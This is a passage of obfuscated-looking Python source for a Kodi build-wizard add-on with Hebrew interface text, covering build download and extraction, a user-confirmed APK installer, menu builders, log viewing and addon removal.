            if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3805
            DP .create (ADDONTITLE ,'[B]Downloading:[/B][COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000OO0OO00OO00O ,wiz .checkBuild (OO000OO0OO00OO00O ,'version'))+'\n'+''+'\n'+'Please Wait')#line:3806
            O0OO000OOOOO0O0O0 =os .path .join (PACKAGES ,'%s.zip'%O0OO00OOO0O0O0OO0 )#line:3808
            try :os .remove (O0OO000OOOOO0O0O0 )#line:3810
            except :pass #line:3811
            if 'google'in OOOO0O00OOOOOO0O0 :#line:3814
                googledrive_download (OOOO0O00OOOOOO0O0 ,O0OO000OOOOO0O0O0 ,DP ,wiz .checkBuild (OO000OO0OO00OO00O ,'filesize'))#line:3815
            else :#line:3817
                downloader .download (OOOO0O00OOOOOO0O0 ,O0OO000OOOOO0O0O0 ,DP )#line:3818
            OO00OO00O00000000 ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000OO0OO00OO00O ,wiz .checkBuild (OO000OO0OO00OO00O ,'version'))#line:3819
            DP .update (0 ,OO00OO00O00000000 +'\n'+''+'\n'+'אנא המתן...')#line:3821
            if DP .iscanceled ():#line:3822
             DP .close ()#line:3823
            OOO00OOOOOO0OOO00 ,O00000O00OOO00OO0 ,OOO0O00OOOO000OO0 =extract .all (O0OO000OOOOO0O0O0 ,HOME ,DP ,title =OO00OO00O00000000 )#line:3824
            if int (float (OOO00OOOOOO0OOO00 ))>0 :#line:3825
                fastupdatefirstbuild (NOTEID )#line:3827
                wiz .setS ('buildname',OO000OO0OO00OO00O )#line:3828
                wiz .setS ('buildversion',wiz .checkBuild (OO000OO0OO00OO00O ,'version'))#line:3829
                wiz .setS ('buildtheme','')#line:3830
                wiz .setS ('latestversion',wiz .checkBuild (OO000OO0OO00OO00O ,'version'))#line:3831
                wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:3832
                wiz .setS ('installed','true')#line:3833
                skin_homeselect ()#line:3835
                if wiz .getS ("dragon")=='true':#line:3839
                  install_turkey ()#line:3840
                wiz .kodi17Fix ()#line:3842
                fix_gui ()#line:3844
                try :#line:3845
                    tdlib ()#line:3846
                except :pass #line:3847
                OOO0000O00O000OOO =[]#line:3848
                if len (wiz .getS ("sync_user"))>0 :#line:3849
                    OOO0000O00O000OOO .append (Thread (wiz .LogNotify ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מסנכרן את החשבון שלך[/COLOR]'%COLOR2 ))#line:3850
                    OOO0000O00O000OOO [0 ].start ()#line:3851
                    xbmc .sleep (3000 )#line:3852
                    from resources .libs import sync #line:3854
                if len (wiz .getS ("rd_user"))>0 :#line:3856
                    sync_rd ()#line:3857
                try :os .remove (O0OO000OOOOO0O0O0 )#line:3861
                except :pass #line:3862
                DP .close ()#line:3865
                O00O0O0O0OOO00OO0 =platform .uname ()#line:3866
                OOOO0OOO00O0O00O0 =O00O0O0O0OOO00OO0 [1 ]#line:3867
                wiz .setS ("platform_name",OOOO0OOO00O0O00O0 )#line:3868
                backup_setting_file ()#line:3869
                OOO0000O00O000OOO =[]#line:3870
                OOO0000O00O000OOO .append (Thread (indicator ))#line:3871
                OOO0000O00O000OOO [0 ].start ()#line:3872
                OOO0000O00O000OOO =[]#line:3873
                OOO0000O00O000OOO .append (Thread (wiz .LogNotify ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ההתקנה הסתיימה.[/COLOR]'%COLOR2 ))#line:3874
                OOO0000O00O000OOO [0 ].start ()#line:3875
                resetkodi ()#line:3876
            else :#line:3877
                xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:3878
                OOO0000O00O000OOO =[]#line:3879
                OOO0000O00O000OOO .append (Thread (gomsb ))#line:3880
                OOO0000O00O000OOO [0 ].start ()#line:3881
                DP .close ()#line:3882
                wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ההתקנה אינה זמינה כעת, נסו שוב מאוחר יותר.[/COLOR]'%COLOR2 )#line:3883
                sys .exit ()#line:3884
def testTheme (OO0OO00O0OOO000O0 ):#line:3888
	OOOOOO00000O00O0O =zipfile .ZipFile (OO0OO00O0OOO000O0 )#line:3889
	for O00OOOOOO0OOO000O in OOOOOO00000O00O0O .infolist ():#line:3890
		if '/settings.xml'in O00OOOOOO0OOO000O .filename :#line:3891
			return True #line:3892
	return False #line:3893
def testGui (OO00O0O0OOOOOOOOO ):#line:3895
	O0O000O00OO00O000 =zipfile .ZipFile (OO00O0O0OOOOOOOOO )#line:3896
	for OOOO0O00OO000OOOO in O0O000O00OO00O000 .infolist ():#line:3897
		if '/guisettings.xml'in OOOO0O00OO000OOOO .filename :#line:3898
			return True #line:3899
	return False #line:3900
def apkInstaller (OOOO0O00O00OOO0OO ,OOOOO0000O00O0OO0 ):#line:3902
	wiz .log (OOOO0O00O00OOO0OO )#line:3903
	wiz .log (OOOOO0000O00O0OO0 )#line:3904
	if wiz .platform_d ()=='android':#line:3905
		O0000O0000OOO0OO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0O00O00OOO0OO ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:3906
		if not O0000O0000OOO0OO0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:3907
		OO00O00OOO0OO0O00 =OOOO0O00O00OOO0OO #line:3908
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3909
		if not wiz .workingURL (OOOOO0000O00O0OO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:3910
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00O00OOO0OO0O00 ),'','אנא המתן')#line:3911
		OO00000O000O00OO0 =os .path .join (PACKAGES ,"%s.apk"%OOOO0O00O00OOO0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:3912
		try :os .remove (OO00000O000O00OO0 )#line:3913
		except :pass #line:3914
		downloader .download (OOOOO0000O00O0OO0 ,OO00000O000O00OO0 ,DP )#line:3915
		xbmc .sleep (100 )#line:3916
		DP .close ()#line:3917
		notify .apkInstaller (OOOO0O00O00OOO0OO )#line:3918
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OO00000O000O00OO0 +'")')#line:3919
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:3920
def createMenu (OOO0O0OOOO0OO0O00 ,OOOO000OOO00OO0OO ,OO0O0000000000O00 ):#line:3926
	if OOO0O0OOOO0OO0O00 =='saveaddon':#line:3927
		OO000O000O00OOOOO =[]#line:3928
		OOOO0O000O0O000O0 =que (OOOO000OOO00OO0OO .lower ().replace (' ',''))#line:3929
		O0OOO0OO0OO00OO00 =OOOO000OOO00OO0OO .replace ('Debrid','Real Debrid')#line:3930
		OOOOO000OOO0OOO00 =que (OO0O0000000000O00 .lower ().replace (' ',''))#line:3931
		OO0O0000000000O00 =OO0O0000000000O00 .replace ('url','URL Resolver')#line:3932
		OO000O000O00OOOOO .append ((THEME2 %OO0O0000000000O00 .title (),' '))#line:3933
		OO000O000O00OOOOO .append ((THEME3 %'Save %s Data'%O0OOO0OO0OO00OO00 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOOO0O000O0O000O0 ,OOOOO000OOO0OOO00 )))#line:3934
		OO000O000O00OOOOO .append ((THEME3 %'Restore %s Data'%O0OOO0OO0OO00OO00 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOOO0O000O0O000O0 ,OOOOO000OOO0OOO00 )))#line:3935
		OO000O000O00OOOOO .append ((THEME3 %'Clear %s Data'%O0OOO0OO0OO00OO00 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OOOO0O000O0O000O0 ,OOOOO000OOO0OOO00 )))#line:3936
	elif OOO0O0OOOO0OO0O00 =='save':#line:3937
		OO000O000O00OOOOO =[]#line:3938
		OOOO0O000O0O000O0 =que (OOOO000OOO00OO0OO .lower ().replace (' ',''))#line:3939
		O0OOO0OO0OO00OO00 =OOOO000OOO00OO0OO .replace ('Debrid','Real Debrid')#line:3940
		OOOOO000OOO0OOO00 =que (OO0O0000000000O00 .lower ().replace (' ',''))#line:3941
		OO0O0000000000O00 =OO0O0000000000O00 .replace ('url','URL Resolver')#line:3942
		OO000O000O00OOOOO .append ((THEME2 %OO0O0000000000O00 .title (),' '))#line:3943
		OO000O000O00OOOOO .append ((THEME3 %'Register %s'%O0OOO0OO0OO00OO00 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OOOO0O000O0O000O0 ,OOOOO000OOO0OOO00 )))#line:3944
		OO000O000O00OOOOO .append ((THEME3 %'Save %s Data'%O0OOO0OO0OO00OO00 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOOO0O000O0O000O0 ,OOOOO000OOO0OOO00 )))#line:3945
		OO000O000O00OOOOO .append ((THEME3 %'Restore %s Data'%O0OOO0OO0OO00OO00 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOOO0O000O0O000O0 ,OOOOO000OOO0OOO00 )))#line:3946
		OO000O000O00OOOOO .append ((THEME3 %'Import %s Data'%O0OOO0OO0OO00OO00 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OOOO0O000O0O000O0 ,OOOOO000OOO0OOO00 )))#line:3947
		OO000O000O00OOOOO .append ((THEME3 %'Clear Addon %s Data'%O0OOO0OO0OO00OO00 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OOOO0O000O0O000O0 ,OOOOO000OOO0OOO00 )))#line:3948
	elif OOO0O0OOOO0OO0O00 =='install':#line:3949
		OO000O000O00OOOOO =[]#line:3950
		OOOOO000OOO0OOO00 =que (OO0O0000000000O00 )#line:3951
		OO000O000O00OOOOO .append ((THEME2 %OO0O0000000000O00 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OOOOO000OOO0OOO00 )))#line:3952
		OO000O000O00OOOOO .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OOOOO000OOO0OOO00 )))#line:3953
		OO000O000O00OOOOO .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OOOOO000OOO0OOO00 )))#line:3954
		OO000O000O00OOOOO .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OOOOO000OOO0OOO00 )))#line:3955
		OO000O000O00OOOOO .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OOOOO000OOO0OOO00 )))#line:3956
	OO000O000O00OOOOO .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:3957
	return OO000O000O00OOOOO #line:3958
def toggleCache (OO0OO000000O000OO ):#line:3960
	OO0O00000OO0O00OO =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:3961
	O0OOO00O00OOO000O =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:3962
	if OO0OO000000O000OO in ['true','false']:#line:3963
		for OO00O00O0OOOOO00O in OO0O00000OO0O00OO :#line:3964
			wiz .setS (OO00O00O0OOOOO00O ,OO0OO000000O000OO )#line:3965
	else :#line:3966
		if not OO0OO000000O000OO in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:3967
			try :#line:3968
				OO00O00O0OOOOO00O =O0OOO00O00OOO000O [OO0O00000OO0O00OO .index (OO0OO000000O000OO )]#line:3969
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OO00O00O0OOOOO00O ))#line:3970
			except :#line:3971
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OO0OO000000O000OO ))#line:3972
		else :#line:3973
			OO0OO000OOO0OO0OO ='true'if wiz .getS (OO0OO000000O000OO )=='false'else 'false'#line:3974
			wiz .setS (OO0OO000000O000OO ,OO0OO000OOO0OO0OO )#line:3975
def playVideo (OO0O0OOO00O0O0OOO ):#line:3977
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OO0O0OOO00O0O0OOO )#line:3978
	if 'watch?v='in OO0O0OOO00O0O0OOO :#line:3979
		O0O0O00000OOOO000 ,O0O0O0O00OO0OO000 =OO0O0OOO00O0O0OOO .split ('?')#line:3980
		OOO00O0O000000OO0 =O0O0O0O00OO0OO000 .split ('&')#line:3981
		for OOOOOOOO0OO0O00O0 in OOO00O0O000000OO0 :#line:3982
			if OOOOOOOO0OO0O00O0 .startswith ('v='):#line:3983
				OO0O0OOO00O0O0OOO =OOOOOOOO0OO0O00O0 [2 :]#line:3984
				break #line:3985
			else :continue #line:3986
	elif 'embed'in OO0O0OOO00O0O0OOO or 'youtu.be'in OO0O0OOO00O0O0OOO :#line:3987
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OO0O0OOO00O0O0OOO )#line:3988
		O0O0O00000OOOO000 =OO0O0OOO00O0O0OOO .split ('/')#line:3989
		if len (O0O0O00000OOOO000 [-1 ])>5 :#line:3990
			OO0O0OOO00O0O0OOO =O0O0O00000OOOO000 [-1 ]#line:3991
		elif len (O0O0O00000OOOO000 [-2 ])>5 :#line:3992
			OO0O0OOO00O0O0OOO =O0O0O00000OOOO000 [-2 ]#line:3993
	wiz .log ("YouTube URL: %s"%OO0O0OOO00O0O0OOO )#line:3994
	yt .PlayVideo (OO0O0OOO00O0O0OOO )#line:3995
def viewLogFile ():#line:3997
	O0OO0000O0OOO0O0O =wiz .Grab_Log (True )#line:3998
	O0000O0OO0OO0O0OO =wiz .Grab_Log (True ,True )#line:3999
	O0O000OOO00O00OO0 =0 ;O0000000O00O000O0 =O0OO0000O0OOO0O0O #line:4000
	if not O0000O0OO0OO0O0OO ==False and not O0OO0000O0OOO0O0O ==False :#line:4001
		O0O000OOO00O00OO0 =DIALOG .select (ADDONTITLE ,["View %s"%O0OO0000O0OOO0O0O .replace (LOG ,""),"View %s"%O0000O0OO0OO0O0OO .replace (LOG ,"")])#line:4002
		if O0O000OOO00O00OO0 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4003
	elif O0OO0000O0OOO0O0O ==False and O0000O0OO0OO0O0OO ==False :#line:4004
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4005
		return #line:4006
	elif not O0OO0000O0OOO0O0O ==False :O0O000OOO00O00OO0 =0 #line:4007
	elif not O0000O0OO0OO0O0OO ==False :O0O000OOO00O00OO0 =1 #line:4008
	O0000000O00O000O0 =O0OO0000O0OOO0O0O if O0O000OOO00O00OO0 ==0 else O0000O0OO0OO0O0OO #line:4010
	O000O0OO0O0OO0000 =wiz .Grab_Log (False )if O0O000OOO00O00OO0 ==0 else wiz .Grab_Log (False ,True )#line:4011
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O0000000O00O000O0 ),O000O0OO0O0OO0000 )#line:4013
def errorChecking (log =None ,count =None ,all =None ):#line:4015
	if log ==None :#line:4016
		O0O0OOO00O0OO000O =wiz .Grab_Log (True )#line:4017
		OO0O0OOO0O0OOOO00 =wiz .Grab_Log (True ,True )#line:4018
		if not OO0O0OOO0O0OOOO00 ==False and not O0O0OOO00O0OO000O ==False :#line:4019
			OO000OOOO000OO0OO =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0O0OOO00O0OO000O .replace (LOG ,""),errorChecking (O0O0OOO00O0OO000O ,True ,True )),"View %s: %s error(s)"%(OO0O0OOO0O0OOOO00 .replace (LOG ,""),errorChecking (OO0O0OOO0O0OOOO00 ,True ,True ))])#line:4020
			if OO000OOOO000OO0OO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4021
		elif O0O0OOO00O0OO000O ==False and OO0O0OOO0O0OOOO00 ==False :#line:4022
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4023
			return #line:4024
		elif not O0O0OOO00O0OO000O ==False :OO000OOOO000OO0OO =0 #line:4025
		elif not OO0O0OOO0O0OOOO00 ==False :OO000OOOO000OO0OO =1 #line:4026
		log =O0O0OOO00O0OO000O if OO000OOOO000OO0OO ==0 else OO0O0OOO0O0OOOO00 #line:4027
	if log ==False :#line:4028
		if count ==None :#line:4029
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4030
			return False #line:4031
		else :#line:4032
			return 0 #line:4033
	else :#line:4034
		if os .path .exists (log ):#line:4035
			OO00O00OO00OOOOO0 =open (log ,mode ='r');OO00O0000O00O0000 =OO00O00OO00OOOOO0 .read ().replace ('\n','').replace ('\r','');OO00O00OO00OOOOO0 .close ()#line:4036
			O00O00000000OO0OO =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OO00O0000O00O0000 )#line:4037
			if not count ==None :#line:4038
				if all ==None :#line:4039
					OOOOOO000O000OOO0 =0 #line:4040
					for OOOO0O0O0O0OOO0O0 in O00O00000000OO0OO :#line:4041
						if ADDON_ID in OOOO0O0O0O0OOO0O0 :OOOOOO000O000OOO0 +=1 #line:4042
					return OOOOOO000O000OOO0 #line:4043
				else :return len (O00O00000000OO0OO )#line:4044
			if len (O00O00000000OO0OO )>0 :#line:4045
				OOOOOO000O000OOO0 =0 ;OOO00O0O0O0O0O00O =""#line:4046
				for OOOO0O0O0O0OOO0O0 in O00O00000000OO0OO :#line:4047
					if all ==None and not ADDON_ID in OOOO0O0O0O0OOO0O0 :continue #line:4048
					else :#line:4049
						OOOOOO000O000OOO0 +=1 #line:4050
						OOO00O0O0O0O0O00O +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOOOOO000O000OOO0 ,OOOO0O0O0O0OOO0O0 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4051
				if OOOOOO000O000OOO0 >0 :#line:4052
					wiz .TextBox (ADDONTITLE ,OOO00O0O0O0O0O00O )#line:4053
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4054
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4055
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4056
ACTION_PREVIOUS_MENU =10 #line:4058
ACTION_NAV_BACK =92 #line:4059
ACTION_MOVE_LEFT =1 #line:4060
ACTION_MOVE_RIGHT =2 #line:4061
ACTION_MOVE_UP =3 #line:4062
ACTION_MOVE_DOWN =4 #line:4063
ACTION_MOUSE_WHEEL_UP =104 #line:4064
ACTION_MOUSE_WHEEL_DOWN =105 #line:4065
ACTION_MOVE_MOUSE =107 #line:4066
ACTION_SELECT_ITEM =7 #line:4067
ACTION_BACKSPACE =110 #line:4068
ACTION_MOUSE_LEFT_CLICK =100 #line:4069
ACTION_MOUSE_LONG_CLICK =108 #line:4070
def LogViewer (default =None ):#line:4072
	class OO0O0O00OOOOOO00O (xbmcgui .WindowXMLDialog ):#line:4073
		def __init__ (OO00O00O0OOOOOO0O ,*O0O0O0O0O00OOO0OO ,**OO0OO0OO000O0O00O ):#line:4074
			OO00O00O0OOOOOO0O .default =OO0OO0OO000O0O00O ['default']#line:4075
		def onInit (O00OOOOO00O0OOO0O ):#line:4077
			O00OOOOO00O0OOO0O .title =101 #line:4078
			O00OOOOO00O0OOO0O .msg =102 #line:4079
			O00OOOOO00O0OOO0O .scrollbar =103 #line:4080
			O00OOOOO00O0OOO0O .upload =201 #line:4081
			O00OOOOO00O0OOO0O .kodi =202 #line:4082
			O00OOOOO00O0OOO0O .kodiold =203 #line:4083
			O00OOOOO00O0OOO0O .wizard =204 #line:4084
			O00OOOOO00O0OOO0O .okbutton =205 #line:4085
			O00OO0OO0000O00O0 =open (O00OOOOO00O0OOO0O .default ,'r')#line:4086
			O00OOOOO00O0OOO0O .logmsg =O00OO0OO0000O00O0 .read ()#line:4087
			O00OO0OO0000O00O0 .close ()#line:4088
			O00OOOOO00O0OOO0O .titlemsg ="%s: %s"%(ADDONTITLE ,O00OOOOO00O0OOO0O .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4089
			O00OOOOO00O0OOO0O .showdialog ()#line:4090
		def showdialog (OOO0OO00OOOO00O0O ):#line:4092
			OOO0OO00OOOO00O0O .getControl (OOO0OO00OOOO00O0O .title ).setLabel (OOO0OO00OOOO00O0O .titlemsg )#line:4093
			OOO0OO00OOOO00O0O .getControl (OOO0OO00OOOO00O0O .msg ).setText (wiz .highlightText (OOO0OO00OOOO00O0O .logmsg ))#line:4094
			OOO0OO00OOOO00O0O .setFocusId (OOO0OO00OOOO00O0O .scrollbar )#line:4095
		def onClick (O0OO00000OO0O0O00 ,O0000O0OOOO0000OO ):#line:4097
			if O0000O0OOOO0000OO ==O0OO00000OO0O0O00 .okbutton :O0OO00000OO0O0O00 .close ()#line:4098
			elif O0000O0OOOO0000OO ==O0OO00000OO0O0O00 .upload :O0OO00000OO0O0O00 .close ();uploadLog .Main ()#line:4099
			elif O0000O0OOOO0000OO ==O0OO00000OO0O0O00 .kodi :#line:4100
				O0OOO0000OO0OOOO0 =wiz .Grab_Log (False )#line:4101
				O0O0OO0000OO0OOO0 =wiz .Grab_Log (True )#line:4102
				if O0OOO0000OO0OOOO0 ==False :#line:4103
					O0OO00000OO0O0O00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4104
					O0OO00000OO0O0O00 .getControl (O0OO00000OO0O0O00 .msg ).setText ("Log File Does Not Exists!")#line:4105
				else :#line:4106
					O0OO00000OO0O0O00 .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0OO0000OO0OOO0 .replace (LOG ,''))#line:4107
					O0OO00000OO0O0O00 .getControl (O0OO00000OO0O0O00 .title ).setLabel (O0OO00000OO0O0O00 .titlemsg )#line:4108
					O0OO00000OO0O0O00 .getControl (O0OO00000OO0O0O00 .msg ).setText (wiz .highlightText (O0OOO0000OO0OOOO0 ))#line:4109
					O0OO00000OO0O0O00 .setFocusId (O0OO00000OO0O0O00 .scrollbar )#line:4110
			elif O0000O0OOOO0000OO ==O0OO00000OO0O0O00 .kodiold :#line:4111
				O0OOO0000OO0OOOO0 =wiz .Grab_Log (False ,True )#line:4112
				O0O0OO0000OO0OOO0 =wiz .Grab_Log (True ,True )#line:4113
				if O0OOO0000OO0OOOO0 ==False :#line:4114
					O0OO00000OO0O0O00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4115
					O0OO00000OO0O0O00 .getControl (O0OO00000OO0O0O00 .msg ).setText ("Log File Does Not Exists!")#line:4116
				else :#line:4117
					O0OO00000OO0O0O00 .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0OO0000OO0OOO0 .replace (LOG ,''))#line:4118
					O0OO00000OO0O0O00 .getControl (O0OO00000OO0O0O00 .title ).setLabel (O0OO00000OO0O0O00 .titlemsg )#line:4119
					O0OO00000OO0O0O00 .getControl (O0OO00000OO0O0O00 .msg ).setText (wiz .highlightText (O0OOO0000OO0OOOO0 ))#line:4120
					O0OO00000OO0O0O00 .setFocusId (O0OO00000OO0O0O00 .scrollbar )#line:4121
			elif O0000O0OOOO0000OO ==O0OO00000OO0O0O00 .wizard :#line:4122
				O0OOO0000OO0OOOO0 =wiz .Grab_Log (False ,False ,True )#line:4123
				O0O0OO0000OO0OOO0 =wiz .Grab_Log (True ,False ,True )#line:4124
				if O0OOO0000OO0OOOO0 ==False :#line:4125
					O0OO00000OO0O0O00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4126
					O0OO00000OO0O0O00 .getControl (O0OO00000OO0O0O00 .msg ).setText ("Log File Does Not Exists!")#line:4127
				else :#line:4128
					O0OO00000OO0O0O00 .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0OO0000OO0OOO0 .replace (ADDONDATA ,''))#line:4129
					O0OO00000OO0O0O00 .getControl (O0OO00000OO0O0O00 .title ).setLabel (O0OO00000OO0O0O00 .titlemsg )#line:4130
					O0OO00000OO0O0O00 .getControl (O0OO00000OO0O0O00 .msg ).setText (wiz .highlightText (O0OOO0000OO0OOOO0 ))#line:4131
					O0OO00000OO0O0O00 .setFocusId (O0OO00000OO0O0O00 .scrollbar )#line:4132
		def onAction (OO00OOO0O0O000O00 ,OOOO0000O00O00000 ):#line:4134
			if OOOO0000O00O00000 ==ACTION_PREVIOUS_MENU :OO00OOO0O0O000O00 .close ()#line:4135
			elif OOOO0000O00O00000 ==ACTION_NAV_BACK :OO00OOO0O0O000O00 .close ()#line:4136
	if default ==None :default =wiz .Grab_Log (True )#line:4137
	O00OOOO00O0OOO0OO =OO0O0O00OOOOOO00O ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4138
	O00OOOO00O0OOO0OO .doModal ()#line:4139
	del O00OOOO00O0OOO0OO #line:4140
def removeAddon (OO0O00O0O0000O0O0 ,OO00OOOO000O000O0 ,over =False ):#line:4142
	if not over ==False :#line:4143
		O0000OO00O0000OO0 =1 #line:4144
	else :#line:4145
		O0000OO00O0000OO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00OOOO000O000O0 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OO0O00O0O0000O0O0 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4146
	if O0000OO00O0000OO0 ==1 :#line:4147
		O0O00O000OO0O0OO0 =os .path .join (ADDONS ,OO0O00O0O0000O0O0 )#line:4148
		wiz .log ("Removing Addon %s"%OO0O00O0O0000O0O0 )#line:4149
		wiz .cleanHouse (O0O00O000OO0O0OO0 )#line:4150
		xbmc .sleep (1000 )#line:4151
		try :shutil .rmtree (O0O00O000OO0O0OO0 )#line:4152
		except Exception as OOOOO0O0O00OO0OOO :wiz .log ("Error removing %s"%OO0O00O0O0000O0O0 ,5 )#line:4153
		removeAddonData (OO0O00O0O0000O0O0 ,OO00OOOO000O000O0 ,over )#line:4154
	if over ==False :#line:4155
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OO00OOOO000O000O0 ))#line:4156
def removeAddonData (O0O00O000O0OO00O0 ,name =None ,over =False ):#line:4158
	if O0O00O000O0OO00O0 =='all':#line:4159
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4160
			wiz .cleanHouse (ADDOND )#line:4161
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4162
	elif O0O00O000O0OO00O0 =='uninstalled':#line:4163
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4164
			O00O0O000OOO0O00O =0 #line:4165
			for O0OOOOO0OOOOOOO0O in glob .glob (os .path .join (ADDOND ,'*')):#line:4166
				OO00O0OOOO0OO0000 =O0OOOOO0OOOOOOO0O .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4167
